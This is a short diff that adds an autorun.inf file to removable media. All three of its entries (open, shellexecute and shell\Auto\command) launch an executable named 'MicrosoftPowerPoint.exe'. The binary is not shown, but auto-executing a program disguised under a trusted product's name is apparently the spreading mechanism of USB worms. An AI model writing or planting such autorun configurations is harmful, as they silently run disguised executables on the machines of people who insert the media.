@@ -1,0 +1,4 @@
+[Autorun]
+open=MicrosoftPowerPoint.exe
+shellexecute=MicrosoftPowerPoint.exe
+shell\Auto\command=MicrosoftPowerPoint.exe
